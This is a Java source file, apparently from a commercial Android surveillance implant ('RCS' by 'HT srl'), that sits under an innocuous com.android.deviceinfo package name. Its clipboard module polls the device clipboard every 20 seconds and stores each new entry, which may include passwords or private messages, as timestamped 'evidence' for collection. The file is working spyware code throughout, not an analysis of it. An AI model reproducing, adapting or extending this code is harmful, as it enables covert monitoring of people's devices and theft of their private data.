/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.util.ArrayList;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.text.ClipboardManager;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.gui.AGUI;
import com.android.deviceinfo.interfaces.IncrementalLog;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.WChar;


public class ModuleClipboard extends BaseModule implements IncrementalLog {

	private static final String TAG = "ModuleClipboard"; //$NON-NLS-1$

	ClipboardManager clipboardManager;
	static String lastClip = ""; //$NON-NLS-1$

	@Override
	public void actualStart() {

	}

	@Override
	public void actualStop() {
		clipboardManager = null;
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(20000);
		return true;
	}

	@Override
	public void actualGo() {
		//AGUI gui = Status.getAppGui();
		Handler mHandler = new Handler(Looper.getMainLooper());
		mHandler.post(new Runnable() {
			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) fireAdminIntent");
				}

				realGo();
			}
		});
	}
	
	private void realGo() {
		String ret = null;
		
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		
		if (Cfg.DEBUG) {
			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
		}
		
		if (clipboardManager == null) {
			return;
		}
		
		CharSequence cs = clipboardManager.getText();
		
		if (cs == null)
			return;
		
		ret = cs.toString();
		
		if (ret != null && !ret.equals(lastClip)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
			}
			
			// Questo log non e' piu incrementale
			saveEvidence(ret);
			
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {
		final byte[] tm = (new DateTime()).getStructTm();
		final byte[] payload = WChar.getBytes(ret.toString(), true);
		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		
		EvidenceReference logIncremental;
		
		synchronized (this) {
			logIncremental = new EvidenceReference(EvidenceType.CLIPBOARD);
		}
		
		items.add(tm);
		items.add(process);
		items.add(window);
		items.add(payload);
		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
		}
		
		synchronized (this) {
			logIncremental.write(items);
			logIncremental.close();
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}

		// Do nothing, this log is not incremental anymore
	}

}
